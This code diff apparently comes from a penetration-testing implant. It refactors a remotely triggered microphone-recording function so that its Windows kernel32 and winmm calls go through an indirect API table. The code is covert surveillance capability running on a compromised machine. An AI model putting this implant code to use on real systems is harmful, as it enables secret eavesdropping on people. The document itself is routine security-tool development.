@@ -20,7 +20,7 @@ void CALLBACK waveInProc(HWAVEIN hwi, UINT uMsg, DWORD_PTR dwInstance,
 {
 	if (uMsg == WIM_DATA) {
 		memcpy(dataBuffer, recordBuffer, buffersize);
-		SetEvent(recordMicEvent);
+		met_api->win_api.kernel32.SetEvent(recordMicEvent);
 	}
 }
 
@@ -31,7 +31,7 @@ DWORD request_ui_record_mic(Remote * remote, Packet * request)
 {
 	DWORD dwResult = ERROR_SUCCESS;
 	Packet *response = NULL;
-	HANDLE procHeap = GetProcessHeap();
+	HANDLE procHeap = met_api->win_api.kernel32.GetProcessHeap();
 	UINT seconds;
 	DWORD chunkSize;
 	DWORD subChunk1Size;
@@ -57,18 +57,18 @@ DWORD request_ui_record_mic(Remote * remote, Packet * request)
 		riffsize = buffersize + 44;
 
 		if (recordBuffer != NULL) {
-			HeapFree(procHeap, 0, recordBuffer);
+			met_api->win_api.kernel32.HeapFree(procHeap, 0, recordBuffer);
 		}
-		recordBuffer = HeapAlloc(procHeap, HEAP_ZERO_MEMORY, buffersize);
+		recordBuffer = met_api->win_api.kernel32.HeapAlloc(procHeap, HEAP_ZERO_MEMORY, buffersize);
 
 		if (sendBuffer != NULL) {
-			HeapFree(procHeap, 0, sendBuffer);
+			met_api->win_api.kernel32.HeapFree(procHeap, 0, sendBuffer);
 		}
-		sendBuffer = HeapAlloc(procHeap, HEAP_ZERO_MEMORY, riffsize);
+		sendBuffer = met_api->win_api.kernel32.HeapAlloc(procHeap, HEAP_ZERO_MEMORY, riffsize);
 
 		if (recordBuffer == NULL || sendBuffer == NULL) {
 			dprintf("request_ui_record_mic: Allocation failed");
-			dwResult = GetLastError();
+			dwResult = met_api->win_api.kernel32.GetLastError();
 			goto out;
 		}
 		dataBuffer = sendBuffer + 44;
@@ -113,7 +113,7 @@ DWORD request_ui_record_mic(Remote * remote, Packet * request)
 	wf.nBlockAlign = 1;
 	wf.wBitsPerSample = 8;
 	wf.cbSize = 0;
-	dwResult = waveInOpen(&hWavIn, WAVE_MAPPER, &wf, (DWORD_PTR)waveInProc,
+	dwResult = met_api->win_api.winmm.waveInOpen(&hWavIn, WAVE_MAPPER, &wf, (DWORD_PTR)waveInProc,
 		(DWORD_PTR)NULL, CALLBACK_FUNCTION);
 	if (dwResult != MMSYSERR_NOERROR) {
 		dprintf("request_ui_record_mic: WaveInOpen failed");
@@ -123,22 +123,22 @@ DWORD request_ui_record_mic(Remote * remote, Packet * request)
 	wh.lpData = (LPSTR) recordBuffer;
 	wh.dwBufferLength = buffersize;
 	wh.dwFlags = 0;
-	waveInPrepareHeader(hWavIn, &wh, sizeof(wh));
-	waveInAddBuffer(hWavIn, &wh, sizeof(wh));
+	met_api->win_api.winmm.waveInPrepareHeader(hWavIn, &wh, sizeof(wh));
+	met_api->win_api.winmm.waveInAddBuffer(hWavIn, &wh, sizeof(wh));
 
-	recordMicEvent = CreateEvent(NULL,	// default security attributes
+	recordMicEvent = met_api->win_api.kernel32.CreateEventA(NULL,	// default security attributes
 		FALSE,				// auto-reset event
 		FALSE,				// initial state is nonsignaled
 		NULL);				// no object name
 
-	dwResult = (DWORD) waveInStart(hWavIn);
+	dwResult = (DWORD) met_api->win_api.winmm.waveInStart(hWavIn);
 	if (dwResult != MMSYSERR_NOERROR) {
 		dprintf("request_ui_record_mic: WaveInStart failed");
 		goto out;
 	}
 
-	WaitForSingleObject(recordMicEvent, seconds * 1000 + 1000);
-	dwResult = (DWORD) waveInStop(hWavIn);	//seems to wait for buffer to complete
+	met_api->win_api.kernel32.WaitForSingleObject(recordMicEvent, seconds * 1000 + 1000);
+	dwResult = (DWORD) met_api->win_api.winmm.waveInStop(hWavIn);	//seems to wait for buffer to complete
 	if (dwResult != MMSYSERR_NOERROR) {
 		dprintf("request_ui_record_mic: WaveInStop failed");
 		goto out;
